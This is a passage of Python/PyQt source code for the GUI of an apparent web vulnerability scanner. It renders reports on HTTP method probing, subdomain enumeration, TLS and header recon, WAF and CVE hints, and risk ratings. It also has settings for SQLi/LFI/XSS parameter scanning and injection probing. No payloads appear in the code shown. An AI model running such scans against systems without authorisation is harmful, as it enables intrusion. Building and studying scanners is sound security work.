        html += "<table><tr><th>Method</th><th>Status</th><th>Time (ms)</th><th>Body Len</th><th>Content-Type</th><th>Location / Note</th></tr>"
        ALL_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]
        for method in ALL_METHODS:
            r = fp["methods"].get(method)
            if not r:
                continue
            code    = r.get("status")
            err     = r.get("error", "")
            ms      = r.get("elapsed_ms", "?")
            clen    = len(r.get("body", ""))
            ct      = r.get("content_type", "").split(";")[0].strip()
            loc     = r.get("location", "")
            fp_flag = " ⚠ catch-all FP" if r.get("false_positive") else ""
            sc      = status_color(code)
            is_interesting = method in fp.get("interesting", {})
            weight  = "bold" if is_interesting else "normal"
            if code is None:
                html += f"<tr><td style='color:{C['cyan']};font-weight:{weight}'>{method}</td><td class='dim' colspan='5'>{err}</td></tr>"
            else:
                note = loc or fp_flag
                html += (f"<tr><td style='color:{C['cyan']};font-weight:{weight}'>{method}</td>"
                         f"<td style='color:{sc};font-weight:bold'>{code}</td>"
                         f"<td class='dim'>{ms}</td><td class='dim'>{clen:,}</td>"
                         f"<td class='dim'>{ct}</td><td class='dim'>{note}</td></tr>")
        html += "</table>"

        allowed = fp.get("allowed_from_options", [])
        if allowed:
            html += f"<p class='info-box'>OPTIONS Allow header: <span class='cyan'>{', '.join(allowed)}</span></p>"

        chain = fp.get("redirect_chain", [])
        if chain:
            html += "<h2>Redirect Chain</h2><div class='card'>"
            for hop in chain:
                html += f"<div class='kv'><span class='key' style='color:{status_color(hop['status'])}'>{hop['status']}</span>"
                html += f"<span class='val dim'>→ {hop.get('location', '?')}</span></div>"
            html += "</div>"

        if fp.get("url_params"):
            html += "<h2>URL Parameters Detected</h2><div class='card'>"
            for k, v in fp["url_params"].items():
                val = v[0] if isinstance(v, list) else v
                html += f"<div class='kv'><span class='key cyan'>{k}</span><span class='val dim'>{val}</span></div>"
            html += "</div>"

        param_vulns = fp.get("param_vulns", [])
        if param_vulns:
            html += "<h2>🚨 Parameter Vulnerability Findings</h2>"
            for pv in param_vulns:
                html += f"<div class='vuln-box'>"
                html += f"<p class='crit'>⚡ [{pv['vuln_type'].upper()}] param=<span style='color:{C['cyan']}'>{pv['param']}</span>"
                html += f"  status={pv['status']}</p>"
                payload_safe = str(pv['payload']).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                html += f"<p class='dim'>Payload: <span class='warn'>{payload_safe}</span></p>"
                if pv.get("evidence"):
                    ev_safe = pv['evidence'].replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                    html += f"<p class='dim'>Evidence: <span class='ok'>{ev_safe}</span></p>"
                url_safe = pv['test_url'].replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                html += f"<p class='dim'>Test URL: {url_safe}</p>"
                html += "</div>"

        html += "<div class='grid-2'>"
        html += "<div class='card'><h3>Tech Stack</h3>"
        if fp.get("tech"):
            html += "".join(f"<span class='badge badge-cyan'>{t}</span>" for t in fp["tech"])
        else:
            html += "<p class='dim'>None detected</p>"
        if fp.get("server"):       html += f"<p class='dim' style='margin-top:8px'>Server: <span class='cyan'>{fp['server']}</span></p>"
        if fp.get("x_powered_by"): html += f"<p class='dim'>X-Powered: <span class='cyan'>{fp['x_powered_by']}</span></p>"
        if fp.get("versions"):
            for t, v in fp["versions"].items():
                html += f"<p class='dim'>{t}: <span class='warn'>{v}</span></p>"
        html += "</div>"

        html += "<div class='card'><h3>WAF / CDN</h3>"
        if fp.get("waf"):
            for w in fp["waf"]:
                html += f"<p class='ok'>✔ {w}</p>"
        else:
            html += "<p class='warn'>⚠ No WAF detected</p>"
        html += "</div></div>"

        html += "<h2>Authentication &amp; Access Control</h2><div class='card'>"
        if fp.get("auth_hints"):
            for a in fp["auth_hints"]:
                html += f"<p class='warn'>⚠ {a}</p>"
        else:
            html += "<p class='dim'>No auth enforcement detected on this endpoint</p>"
        html += "</div>"

        if fp.get("cors_issues") or fp.get("cors_info"):
            html += "<h2>CORS Policy</h2><div class='card'>"
            for c in fp.get("cors_issues", []):
                html += f"<p class='crit'>⚡ {c}</p>"
            for c in fp.get("cors_info", []):
                html += f"<p class='cyan'>{c}</p>"
            html += "</div>"

        html += "<h2>Security Headers</h2><div class='card'>"
        for s in fp.get("sec_ok", []):  html += f"<p class='ok'>✔ {s}</p>"
        for s in fp.get("sec_miss", []): html += f"<p class='warn'>✖ {s} — MISSING</p>"
        html += "</div>"

        html += "<h2>Rate Limiting</h2><div class='card'>"
        for r in fp.get("rl_info", []):
            cl = "warn" if "No rate-limit" in r else "ok"
            html += f"<p class='{cl}'>{r}</p>"
        html += "</div>"

        ba = fp.get("sample_body_analysis", {})
        secrets = ba.get("secrets", [])
        errors  = ba.get("errors", [])
        if secrets or errors:
            html += "<h2>🚨 Body Security Alerts</h2>"
            for s in secrets:
                html += f"<div class='alert-box'><p class='crit'>⚡ SECRET: {s}</p></div>"
            for e in errors:
                html += f"<div class='alert-box'><p class='crit'>⚡ ERROR LEAK: {e}</p></div>"

        hints = ba.get("hints", [])
        if hints:
            html += "<h2>Body Hints</h2><div class='card'>"
            for h in hints:
                html += f"<p class='cyan'>{h}</p>"
            html += "</div>"

        parsed = ba.get("parsed")
        if parsed:
            html += "<h2>JSON Structure</h2><div class='card'>"
            if parsed["type"] == "object":
                html += f"<p class='dim'>Type: <span class='cyan'>object</span></p>"
                html += f"<p class='dim'>Keys ({len(parsed['keys'])}): <span class='ok'>{', '.join(parsed['keys'])}</span></p>"
                data_str = json.dumps(parsed.get("data", {}), indent=2, default=str)
                if len(data_str) < 6000:
                    safe = data_str.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                    html += f"<pre>{safe}</pre>"
            elif parsed["type"] == "array":
                html += f"<p class='dim'>Type: <span class='cyan'>array</span>  — {parsed['count']} items</p>"
                if parsed.get("sample_keys"):
                    html += f"<p class='dim'>Item keys: <span class='ok'>{', '.join(parsed['sample_keys'])}</span></p>"
            html += "</div>"

        raw = ba.get("raw", "") or fp.get("sample_body", "").strip()
        if raw:
            html += f"<h2>Raw Response Body  <span class='dim'>({ba.get('char_len', 0):,} chars total)</span></h2>"
            safe = raw[:6000].replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            html += f"<pre>{safe}{'…' if len(raw) > 6000 else ''}</pre>"

        html += "<h2>Injection Probing (Path-based)</h2><div class='card'>"
        if fp.get("inject_hits"):
            for inj in fp["inject_hits"]:
                html += f"<p class='crit'>⚡ {inj}</p>"
        else:
            html += "<p class='ok'>✔ No path injection patterns triggered</p>"
        html += "</div>"

        if fp.get("cves"):
            html += "<h2>CVE Hints</h2>"
            for cve, desc, ver in fp["cves"]:
                html += f"<div class='card card-crit'><p class='crit'>⚡ {cve}</p>"
                html += f"<p class='dim'>{desc}</p><p class='dim'>Detected: <span class='warn'>{ver}</span></p></div>"

        if fp.get("sample_headers"):
            html += "<h2>Full Response Headers</h2>"
            html += "<table><tr><th>Header</th><th>Value</th></tr>"
            for k, v in fp["sample_headers"].items():
                html += f"<tr><td class='dim'>{k}</td><td>{v}</td></tr>"
            html += "</table>"

        html += _html_close()
        self.setHtml(html)


class SubdomainView(QTextBrowser):
    def __init__(self):
        super().__init__()
        self.setOpenLinks(False)

    def render(self, subs):
        html = _html_head("Subdomains")
        html += "<h1>Subdomain Enumeration Results</h1>"
        if not subs:
            html += "<p class='dim'>No live subdomains found.</p>"
        else:
            html += f"<p class='ok'>Found {len(subs)} live subdomains</p>"
            html += "<table><tr><th>Subdomain</th><th>IP Address</th><th>Status</th></tr>"
            for s in subs:
                html += f"<tr><td class='cyan'>{s['subdomain']}</td><td class='ok'>{s['ip']}</td><td class='ok'>{s['status']}</td></tr>"
            html += "</table>"
        html += _html_close()
        self.setHtml(html)


class ReconView(QTextBrowser):
    def __init__(self):
        super().__init__()
        self.setOpenLinks(False)

    def render(self, p):
        if not p:
            return
        dns     = p.get("dns", {})
        tls     = p.get("tls", {})
        timing  = p.get("timing", {})
        hdrs    = p.get("headers", {})
        tech    = p.get("tech", [])
        waf     = p.get("waf", [])
        versions = p.get("versions", {})
        cves    = p.get("cves", [])
        ck_info  = p.get("cookies", {}).get("info", [])
        ck_issues = p.get("cookies", {}).get("issues", [])
        crawled  = p.get("crawled_params", {})

        html  = _html_head("Recon")
        html += "<h1>⚡ SERVER RECONNAISSANCE REPORT</h1>"
        html += "<h2>Network &amp; DNS</h2><div class='card'>"
        html += f"<div class='kv'><span class='key'>Host</span><span class='val cyan'>{p.get('host', '?')}:{p.get('port', '?')}</span></div>"
        if "ip"       in dns: html += f"<div class='kv'><span class='key'>IP Address</span><span class='val ok'>{dns['ip']}</span></div>"
        if "rdns"     in dns: html += f"<div class='kv'><span class='key'>Reverse DNS</span><span class='val'>{dns['rdns']}</span></div>"
        if "ip_error" in dns: html += f"<div class='kv'><span class='key'>DNS Error</span><span class='val warn'>{dns['ip_error']}</span></div>"
        html += f"<div class='kv'><span class='key'>Scheme</span><span class='val'>{p.get('scheme', '?').upper()}</span></div>"
        if timing:
            html += f"<div class='kv'><span class='key'>Base RTT</span><span class='val'>{timing.get('base_ms', '?')} ms</span></div>"
            if timing.get("redirects"):
                html += f"<div class='kv'><span class='key'>Redirects</span><span class='val'>{timing['redirects']} &rarr; {timing.get('final_url', '')}</span></div>"
        html += "</div>"

        if tls and "tls_error" not in tls:
            exp_days = tls.get("expires_in_days")
            exp_cls  = "crit" if exp_days and exp_days < 14 else ("warn" if exp_days and exp_days < 30 else "ok")
            cipher   = tls.get("cipher", ())
            html += "<h2>TLS / SSL Certificate</h2><div class='card'>"
            html += f"<div class='kv'><span class='key'>Protocol</span><span class='val cyan'>{tls.get('tls_version', '?')}</span></div>"
            if cipher:
                html += f"<div class='kv'><span class='key'>Cipher Suite</span><span class='val'>{cipher[0]} ({cipher[2]} bits)</span></div>"
            subj   = tls.get("subject", {})
            issuer = tls.get("issuer", {})
            html += f"<div class='kv'><span class='key'>Subject (CN)</span><span class='val'>{subj.get('commonName', '?')}</span></div>"
            html += f"<div class='kv'><span class='key'>Issuer</span><span class='val dim'>{issuer.get('organizationName', '?')}</span></div>"
            if exp_days is not None:
                html += f"<div class='kv'><span class='key'>Valid Until</span><span class='val {exp_cls}'>{tls.get('not_after', '?')} ({exp_days} days)</span></div>"
            san = tls.get("san", [])
            if san:
                html += f"<div class='kv'><span class='key'>SANs</span><span class='val dim'>{', '.join(san[:8])}</span></div>"
            proto = tls.get("tls_version", "")
            if proto in ("TLSv1", "TLSv1.1", "SSLv3"):
                html += f"<p class='crit'>⚠ Weak TLS {proto} — upgrade to TLS 1.2/1.3</p>"
            else:
                html += f"<p class='ok'>✔ TLS version acceptable ({proto})</p>"
            html += "</div>"
        elif tls.get("tls_error"):
            html += f"<h2>TLS</h2><div class='card'><p class='warn'>Error: {tls['tls_error']}</p></div>"

        server = hdrs.get("server", "")
        xpb    = hdrs.get("x-powered-by", "")
        html += "<h2>Server Identity &amp; Tech Stack</h2><div class='card'>"
        if server: html += f"<div class='kv'><span class='key'>Server</span><span class='val cyan'>{server}</span></div>"
        if xpb:    html += f"<div class='kv'><span class='key'>X-Powered-By</span><span class='val cyan'>{xpb}</span></div>"
        if tech:
            tags = "".join(f"<span class='badge badge-cyan'>{t}</span>" for t in tech)
            html += f"<div class='kv'><span class='key'>Detected Tech</span><span class='val'>{tags}</span></div>"
        html += "</div>"

        if crawled:
            html += "<h2>Parameters Found on Homepage</h2><div class='card'>"
            html += "<p class='dim' style='margin-bottom:8px'>These parameters were discovered by crawling the target page:</p>"
            for k, v in list(crawled.items())[:30]:
                html += f"<div class='kv'><span class='key cyan'>{k}</span><span class='val dim'>{v}</span></div>"
            html += "</div>"

        if versions:
            html += "<h2>Software Versions</h2><div class='card'>"
            for t, v in versions.items():
                html += f"<div class='kv'><span class='key'>{t}</span><span class='val warn'>{v}</span></div>"
            html += "</div>"

        html += "<h2>WAF / CDN Detection</h2><div class='card'>"
        if waf:
            for w in waf:
                html += f"<p class='ok'>✔ {w}</p>"
        else:
            html += "<p class='warn'>⚠ No WAF/CDN signatures detected</p>"
        html += "</div>"

        if cves:
            html += "<h2>CVE / Known Vulnerability Hints</h2>"
            for cve, desc, ver in cves:
                html += f"<div class='card card-crit'><p class='crit'>⚡ {cve}</p>"
                html += f"<p class='dim'>{desc}</p><p class='dim'>Detected: <span class='warn'>{ver}</span></p></div>"

        if ck_info or ck_issues:
            html += "<h2>Cookie Security</h2><div class='card'>"
            for ci in ck_info[:6]:
                html += f"<p class='dim'>{ci}</p>"
            for cx in ck_issues:
                html += f"<p class='warn'>⚠ {cx}</p>"
            html += "</div>"

        html += "<h2>Security Response Headers</h2><div class='card'>"
        for hdr, label in [("strict-transport-security", "HSTS"), ("content-security-policy", "CSP"),
                           ("x-frame-options", "X-Frame-Options"), ("x-content-type-options", "X-Content-Type-Options"),
                           ("referrer-policy", "Referrer-Policy"), ("permissions-policy", "Permissions-Policy")]:
            val = hdrs.get(hdr, "") or hdrs.get(hdr.title(), "")
            if val: html += f"<div class='kv'><span class='key ok'>✔ {label}</span><span class='val dim'>{val[:100]}</span></div>"
            else:   html += f"<div class='kv'><span class='key warn'>✖ {label}</span><span class='val warn'>MISSING</span></div>"
        html += "</div>"

        html += "<h2>All Response Headers</h2><table><tr><th>Header</th><th>Value</th></tr>"
        for k, v in hdrs.items():
            html += f"<tr><td class='dim'>{k}</td><td>{v}</td></tr>"
        html += "</table>" + _html_close()
        self.setHtml(html)


class RiskReportView(QTextBrowser):
    def __init__(self):
        super().__init__()
        self.setOpenLinks(False)

    def render(self, fps, sp=None):
        crit  = [(p, f) for p, f in fps.items() if f["risk"] == "CRITICAL"]
        high  = [(p, f) for p, f in fps.items() if f["risk"] == "HIGH"]
        med   = [(p, f) for p, f in fps.items() if f["risk"] == "MEDIUM"]
        total  = len(fps)
        active = sum(1 for f in fps.values()
                     if any(r.get("status") not in (404, None) for r in f["methods"].values()))
        vuln_t = sum(len(f.get("param_vulns", [])) for f in fps.values())
        cors_t = sum(1 for f in fps.values() if f.get("cors_issues"))
        ck_t   = sum(1 for f in fps.values() if f.get("ck_issues"))
        no_rl  = sum(1 for f in fps.values() if f.get("rl_info") and "No rate-limit" in f["rl_info"][0])
        secrets_t = sum(len(f.get("sample_body_analysis", {}).get("secrets", [])) for f in fps.values())

        html  = _html_head("Risk Report")
        html += "<h1>⚡ CYBERSECURITY ANALYST RISK REPORT</h1>"
        html += "<div style='display:grid;grid-template-columns:repeat(8,1fr);gap:10px;margin:16px 0'>"
        for lbl, val, col in [
            ("SCANNED",    total,    C["cyan"]),
            ("ACTIVE",     active,   C["green"]),
            ("CRITICAL",   len(crit), C["red"]),
            ("HIGH",       len(high), C["orange"]),
            ("MEDIUM",     len(med),  C["yellow"]),
            ("SECRETS",    secrets_t, C["red"]),
            ("CORS",       cors_t,   C["orange"]),
            ("PARAM VULNS", vuln_t,  C["purple"]),
        ]:
            html += f"""<div class='stat-block'>
                <div class='stat-num' style='color:{col}'>{val}</div>
                <div class='stat-lbl'>{lbl}</div></div>"""
        html += "</div>"

        if sp:
            html += "<h2>Target Summary</h2><div class='card'>"
            dns = sp.get("dns", {})
            tls = sp.get("tls", {})
            html += f"<div class='kv'><span class='key'>Host</span><span class='val cyan'>{sp.get('host', '?')}</span></div>"
            if "ip" in dns: html += f"<div class='kv'><span class='key'>IP</span><span class='val'>{dns['ip']}</span></div>"
            html += f"<div class='kv'><span class='key'>Tech Stack</span><span class='val'>{', '.join(sp.get('tech', [])) or 'Unknown'}</span></div>"
            tver  = tls.get("tls_version", "N/A")
            tdays = tls.get("expires_in_days", "?")
            html += f"<div class='kv'><span class='key'>TLS</span><span class='val'>{tver} (expires in {tdays} days)</span></div>"
            html += f"<div class='kv'><span class='key'>WAF/CDN</span><span class='val'>{', '.join(sp.get('waf', [])) or 'None detected'}</span></div>"
            if sp.get("cves"):
                html += f"<div class='kv'><span class='key'>CVE Hints</span><span class='val crit'>{len(sp['cves'])} hint(s)</span></div>"
            html += "</div>"

        for label, badge_cls, group in [
            ("CRITICAL", "badge-crit", crit),
            ("HIGH",     "badge-high", high),
            ("MEDIUM",   "badge-med",  med),
        ]:
            if not group:
                continue
            card_cls = {"CRITICAL": "card-crit", "HIGH": "card-high", "MEDIUM": "card-med"}[label]
            html += f"<h2><span class='badge {badge_cls}'>{label}</span>  {len(group)} finding(s)</h2>"
            for path, fp in group:
                interesting = fp.get("interesting", {})
                working     = fp.get("working", [])
                s_str       = "  ".join(f"{m}={r['status']}" for m, r in interesting.items() if r.get("status"))
                ba          = fp.get("sample_body_analysis", {})
                param_vulns = fp.get("param_vulns", [])
                html += f"<div class='card {card_cls}'>"
                html += f"<p style='font-size:13px;font-weight:bold;margin-bottom:6px'>{fp['url']}</p>"
                html += f"<div class='kv'><span class='key'>HTTP Status(es)</span><span class='val dim'>{s_str}</span></div>"
                if working:
                    html += f"<div class='kv'><span class='key'>Working Methods</span><span class='val ok'>{', '.join(working)}</span></div>"
                if fp.get("tech"):
                    html += f"<div class='kv'><span class='key'>Tech</span><span class='val cyan'>{', '.join(fp['tech'])}</span></div>"
                if fp.get("waf"):
                    html += f"<div class='kv'><span class='key'>WAF/CDN</span><span class='val ok'>{', '.join(fp['waf'])}</span></div>"
                if fp.get("auth_hints"):
                    html += f"<div class='kv'><span class='key'>Auth</span><span class='val warn'>{'; '.join(fp['auth_hints'])}</span></div>"
                for pv in param_vulns:
                    payload_safe = str(pv['payload']).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                    html += f"<p class='crit'>⚡ PARAM VULN [{pv['vuln_type'].upper()}] param={pv['param']} payload={payload_safe}</p>"
                for s in ba.get("secrets", []):
                    html += f"<p class='crit'>⚡ SECRET: {s}</p>"
                for e in ba.get("errors", []):
                    html += f"<p class='crit'>⚡ LEAK: {e}</p>"
                for c in fp.get("cors_issues", []):
                    html += f"<p class='crit'>⚡ CORS: {c}</p>"
                for inj in fp.get("inject_hits", []):
                    html += f"<p class='crit'>⚡ Injection: {inj}</p>"
                if fp.get("rl_info") and "No rate-limit" in fp["rl_info"][0]:
                    html += "<p class='warn'>⚠ No rate-limiting detected</p>"
                if fp.get("sec_miss"):
                    html += f"<div class='kv'><span class='key'>Missing Sec Hdrs</span><span class='val warn'>{', '.join(fp['sec_miss'])}</span></div>"
                if fp.get("cves"):
                    for cve, desc, ver in fp["cves"]:
                        html += f"<p class='crit'>⚡ {cve} — v{ver}</p>"
                html += "</div>"

        html += "<h2>Scan Statistics</h2><div class='card'>"
        for lbl, val in [("Paths probed", total), ("Active endpoints", active),
                         ("Critical", len(crit)), ("High", len(high)), ("Medium", len(med)),
                         ("Secret leaks", secrets_t), ("Param vulns", vuln_t),
                         ("CORS issues", cors_t), ("Cookie issues", ck_t), ("No rate-limit", no_rl)]:
            if val:
                html += f"<div class='kv'><span class='key'>{lbl}</span><span class='val'>{val}</span></div>"
        html += "</div>"
        html += _html_close()
        self.setHtml(html)


class HeadersDialog(QDialog):
    def __init__(self, parent, current):
        super().__init__(parent)
        self.setWindowTitle("Custom HTTP Headers")
        self.setMinimumSize(540, 400)
        self.setStyleSheet(QSS + f"QDialog{{background:{C['bg1']};}}")
        lay = QVBoxLayout(self)
        lay.setSpacing(12)
        lay.setContentsMargins(16, 16, 16, 16)
        hdr = QLabel("Custom HTTP Headers")
        hdr.setStyleSheet(f"font-size:14px;font-weight:bold;color:{C['cyan']};background:transparent;")
        sub = QLabel("One header per line in  Key: Value  format")
        sub.setStyleSheet(f"color:{C['t1']};font-size:11px;background:transparent;")
        lay.addWidget(hdr)
        lay.addWidget(sub)
        sep = QFrame()
        sep.setFrameShape(QFrame.HLine)
        sep.setStyleSheet(f"color:{C['line']};")
        lay.addWidget(sep)
        self.editor = QTextEdit()
        self.editor.setPlainText("\n".join(current))
        self.editor.setFont(QFont("Consolas", 12))
        self.editor.setStyleSheet(f"QTextEdit{{background:{C['bg0']};border:1px solid {C['line']};border-radius:5px;color:{C['t0']};font-size:12px;padding:8px;}}")
        lay.addWidget(self.editor)
        prow = QHBoxLayout()
        prow.addWidget(QLabel("Quick add:"))
        for label, value in [("JSON", "Content-Type: application/json"),
                              ("Accept JSON", "Accept: application/json"),
                              ("No Cache", "Cache-Control: no-cache")]:
            b = QPushButton(label)
            b.setFixedHeight(26)
            b.setStyleSheet(f"font-size:10px;padding:2px 10px;background:{C['bg2']};border:1px solid {C['line']};border-radius:3px;")
            b.clicked.connect(lambda _, v=value: self.editor.append(v))
            prow.addWidget(b)
        prow.addStretch()
        lay.addLayout(prow)
        btns = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        btns.setStyleSheet(f"QPushButton{{background:{C['bg2']};border:1px solid {C['line']};border-radius:4px;padding:6px 20px;color:{C['t0']};}} QPushButton:hover{{border-color:{C['cyan']};color:{C['cyan']};}}")
        btns.accepted.connect(self.accept)
        btns.rejected.connect(self.reject)
        lay.addWidget(btns)

    def get_headers(self):
        return [l.strip() for l in self.editor.toPlainText().splitlines() if l.strip() and ":" in l]


class Sidebar(QScrollArea):
    def __init__(self):
        super().__init__()
        self.setWidgetResizable(True)
        self.setMinimumWidth(560)
        self.setMaximumWidth(560)
        self.setSizePolicy(QSizePolicy.Preferred, QSizePolicy.Expanding)
        self.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self.setStyleSheet(f"QScrollArea{{background:{C['bg1']};border:none;border-right:1px solid {C['line']};}} QScrollArea > QWidget > QWidget{{background:{C['bg1']};}}")
        inner = QWidget()
        inner.setStyleSheet(f"background:{C['bg1']};")
        self.setWidget(inner)
        self.lay = QVBoxLayout(inner)
        self.lay.setContentsMargins(14, 14, 14, 14)
        self.lay.setSpacing(14)
        self._custom_headers = []
        self._build()

    def _build(self):
        L = self.lay

        tg = QGroupBox("Target")
        tl = QVBoxLayout(tg)
        tl.setSpacing(8)
        url_lbl = QLabel("URL")
        url_lbl.setStyleSheet(f"color:{C['t1']};font-size:10px;letter-spacing:1px;background:transparent;")
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("https://target.example.com")
        self.url_input.setClearButtonEnabled(True)
        tok_lbl = QLabel("Auth Token (Bearer)")
        tok_lbl.setStyleSheet(f"color:{C['t1']};font-size:10px;letter-spacing:1px;background:transparent;")
        self.token_input = QLineEdit()
        self.token_input.setPlaceholderText("eyJ… or leave blank")
        self.token_input.setEchoMode(QLineEdit.Password)
        wl_lbl = QLabel("Wordlist  (modes 1/4/5)")
        wl_lbl.setStyleSheet(f"color:{C['t1']};font-size:10px;letter-spacing:1px;background:transparent;")
        wl_row = QHBoxLayout()
        wl_row.setSpacing(6)
        self.wordlist_input = QLineEdit()
        self.wordlist_input.setPlaceholderText("wordlist.txt")
        btn_browse = QPushButton("…")
        btn_browse.setFixedWidth(34)
        btn_browse.setFixedHeight(34)
        btn_browse.setObjectName("btn_action")
        wl_row.addWidget(self.wordlist_input)
        wl_row.addWidget(btn_browse)
        btn_browse.clicked.connect(self._browse_wl)
        tl.addWidget(url_lbl)
        tl.addWidget(self.url_input)
        tl.addWidget(tok_lbl)
        tl.addWidget(self.token_input)
        tl.addWidget(wl_lbl)
        tl.addLayout(wl_row)
        L.addWidget(tg)

        mg = QGroupBox("Scan Mode")
        ml = QVBoxLayout(mg)
        ml.setSpacing(8)
        self.mode_combo = QComboBox()
        self.mode_combo.addItems([
            "1  —  Normal      (wordlist paths)",
            "2  —  Crawl       (extract links from page)",
            "3  —  API         (built-in API route list)",
            "4  —  Hybrid      (Normal + Crawl + API)",
            "5  —  Full        (everything combined)",
            "6  —  Probe       (all 7 methods, single path)",
        ])
        self.mode_combo.setCurrentIndex(2)
        probe_lbl = QLabel("Probe path  (mode 6 only)")
        probe_lbl.setStyleSheet(f"color:{C['t1']};font-size:10px;letter-spacing:1px;background:transparent;")
        self.probe_path = QLineEdit()
        self.probe_path.setPlaceholderText("news-read.php?id=36")
        custom_paths_lbl = QLabel("Extra paths / URLs to scan  (one per line)")
        custom_paths_lbl.setStyleSheet(f"color:{C['t1']};font-size:10px;letter-spacing:1px;background:transparent;")
        self.custom_paths = QTextEdit()
        self.custom_paths.setPlaceholderText("news-read.php?id=36\narticle.php?id=1\nprofile.php?user=admin")
        self.custom_paths.setFixedHeight(80)
        self.custom_paths.setFont(QFont("Consolas", 11))
        ml.addWidget(self.mode_combo)
        ml.addWidget(probe_lbl)
        ml.addWidget(self.probe_path)
        ml.addWidget(custom_paths_lbl)
        ml.addWidget(self.custom_paths)
        L.addWidget(mg)

        me_g = QGroupBox("HTTP Methods")
        me_l = QVBoxLayout(me_g)
        me_l.setSpacing(6)
        self.method_cbs = {}
        row1 = QHBoxLayout()
        row2 = QHBoxLayout()
        for i, m in enumerate(["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]):
            cb = QCheckBox(m)
            cb.setChecked(m in ("GET", "POST", "PUT", "DELETE", "OPTIONS"))
            self.method_cbs[m] = cb
            (row1 if i < 4 else row2).addWidget(cb)
        btn_row = QHBoxLayout()
        for label, mode in [("All", True), ("None", False), ("Common", None)]:
            b = QPushButton(label)
            b.setFixedHeight(24)
            b.setStyleSheet(f"font-size:10px;padding:2px 8px;background:{C['bg3']};border:1px solid {C['line']};border-radius:3px;")
            if mode is True:    b.clicked.connect(lambda: [cb.setChecked(True) for cb in self.method_cbs.values()])
            elif mode is False: b.clicked.connect(lambda: [cb.setChecked(False) for cb in self.method_cbs.values()])
            else:               b.clicked.connect(lambda: [cb.setChecked(cb.text() in ("GET", "POST", "PUT", "DELETE")) for cb in self.method_cbs.values()])
            btn_row.addWidget(b)
        btn_row.addStretch()
        me_l.addLayout(row1)
        me_l.addLayout(row2)
        me_l.addLayout(btn_row)
        L.addWidget(me_g)

        og = QGroupBox("Scan Options")
        ol = QVBoxLayout(og)
        ol.setSpacing(10)
        th_row = QHBoxLayout()
        th_lbl = QLabel("Threads")
        th_lbl.setStyleSheet(f"color:{C['t1']};font-size:11px;background:transparent;")
        self.threads_spin = QSpinBox()
        self.threads_spin.setRange(1, 200)
        self.threads_spin.setValue(40)
        th_row.addWidget(th_lbl)
        th_row.addWidget(self.threads_spin)
        to_row = QHBoxLayout()
        to_lbl = QLabel("Timeout (s)")
        to_lbl.setStyleSheet(f"color:{C['t1']};font-size:11px;background:transparent;")
        self.timeout_spin = QSpinBox()
        self.timeout_spin.setRange(1, 60)
        self.timeout_spin.setValue(8)
        to_row.addWidget(to_lbl)
        to_row.addWidget(self.timeout_spin)
        ol.addLayout(th_row)
        ol.addLayout(to_row)
        self.inject_cb   = QCheckBox("Enable path injection probing  (slower)")
        self.param_cb    = QCheckBox("Enable parameter vulnerability scanning (SQLi/LFI/XSS/etc)")
        self.subdomain_cb = QCheckBox("Enumerate subdomains")
        self.recon_cb    = QCheckBox("Run server recon first")
        self.recon_cb.setChecked(True)
        self.param_cb.setChecked(True)
        self.fp_label    = QLabel("Baseline: not built yet")
        self.fp_label.setStyleSheet(f"color:{C['t2']};font-size:10px;background:transparent;")
        self.fp_label.setWordWrap(True)
        ol.addWidget(self.inject_cb)
        ol.addWidget(self.param_cb)
        ol.addWidget(self.subdomain_cb)
        ol.addWidget(self.recon_cb)
        ol.addWidget(self.fp_label)
        L.addWidget(og)

        hdr_g = QGroupBox("Custom Headers")
        hdr_l = QVBoxLayout(hdr_g)
        hdr_l.setSpacing(6)
        self.headers_preview = QLabel("0 custom headers set")
        self.headers_preview.setStyleSheet(f"color:{C['t2']};font-size:11px;background:transparent;")
        self.headers_preview.setWordWrap(True)
        btn_hdrs = QPushButton("Edit Custom Headers…")
        btn_hdrs.setObjectName("btn_action")
        btn_hdrs.clicked.connect(self._open_hdrs)
        hdr_l.addWidget(self.headers_preview)
        hdr_l.addWidget(btn_hdrs)
        L.addWidget(hdr_g)
        L.addStretch()

        self.btn_start = QPushButton("▶   START SCAN")
        self.btn_start.setObjectName("btn_start")
        self.btn_start.setFixedHeight(46)
        self.btn_stop = QPushButton("■   STOP")
        self.btn_stop.setObjectName("btn_stop")
        self.btn_stop.setEnabled(False)
        self.btn_stop.setFixedHeight(38)
        L.addWidget(self.btn_start)
        L.addWidget(self.btn_stop)

    def update_baseline(self, info):
        if info.get("is_catchall"):
            self.fp_label.setText(
                f"⚠ Catch-all detected (server→{info['status']} for random paths). "
                "FP filter active. Only unique responses shown."
            )
            self.fp_label.setStyleSheet(f"color:{C['orange']};font-size:10px;background:transparent;")
        else:
            self.fp_label.setText(f"✔ Baseline OK (server→{info['status']} for random paths). ALL responses shown (302/403/405/500).")
            self.fp_label.setStyleSheet(f"color:{C['green']};font-size:10px;background:transparent;")

    def _browse_wl(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select Wordlist", "", "Text (*.txt);;All (*)")
        if path:
            self.wordlist_input.setText(path)

    def _open_hdrs(self):
        dlg = HeadersDialog(self, self._custom_headers)
        if dlg.exec_():
            self._custom_headers = dlg.get_headers()
            n = len(self._custom_headers)
            preview = "; ".join(self._custom_headers[:3])
            if n > 3:
                preview += f" +{n-3} more"
            self.headers_preview.setText(f"{n} header(s): {preview}" if n else "0 custom headers set")

    def get_config(self):
        methods = [m for m, cb in self.method_cbs.items() if cb.isChecked()]
        return {
            "url":           self.url_input.text().strip(),
            "token":         self.token_input.text().strip(),
            "wordlist":      self.wordlist_input.text().strip(),
            "mode":          str(self.mode_combo.currentIndex() + 1),
            "probe_path":    self.probe_path.text().strip(),
            "custom_params": self.custom_paths.toPlainText().strip(),
            "methods":       methods,
            "threads":       self.threads_spin.value(),
            "timeout":       self.timeout_spin.value(),
            "inject":        self.inject_cb.isChecked(),
            "param_scan":    self.param_cb.isChecked(),
